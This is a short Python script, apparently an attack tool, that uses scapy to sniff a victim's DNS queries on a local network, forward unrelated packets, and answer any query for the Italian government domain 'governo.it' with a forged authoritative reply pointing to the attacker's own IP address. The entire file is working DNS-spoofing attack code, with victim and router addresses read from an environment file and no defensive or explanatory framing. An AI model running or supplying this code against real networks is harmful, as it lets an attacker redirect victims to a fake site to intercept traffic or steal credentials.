from dotenv import load_dotenv
import os
from scapy.all import sniff, send, Ether, IP, IPv6, UDP, DNS, DNSQR, DNSRR, get_if_addr
#import socket
#from scapy.all import get_if_hwaddr

load_dotenv()
victim_ip = os.getenv("victim_ip")
router_ip = os.getenv("router_ip")
iface = os.getenv("iface")
attacker_ip = get_if_addr(iface)
#attacker_mac = get_if_hwaddr(iface)


def forward(pkt):
	if pkt.haslayer(IP):
		send(pkt[IP], verbose=0)
	elif pkt.haslayer(IPv6):
		send(pkt[IPv6], verbose=0)
	else:
		raise Exception("This shouldn't happen.\nEthery type: " + str(pkt[Ether].type))

def dns_spoof(pkt):
	if not pkt.haslayer(DNSQR):
		forward(pkt)
		return
	
	domain = pkt[DNSQR].qname.decode()

	if not ("governo.it" in domain.lower()):
		forward(pkt)
		return

	spoofed_pkt = (
		IP(dst = pkt[IP].src, src = pkt[IP].dst) /
		UDP(dport = pkt[UDP].sport, sport = 53) /
		DNS(id = pkt[DNS].id, qr = 1, aa = 1, qd = pkt[DNS].qd, an =
	  		DNSRR(rrname = pkt[DNSQR].qname, ttl = 10, rdata = attacker_ip)
		)
	)
	send(spoofed_pkt, verbose=0)

sniff(
	filter = "inbound and udp dst port 53 and src host " + victim_ip,
	prn = dns_spoof, store = 0, iface = iface
)
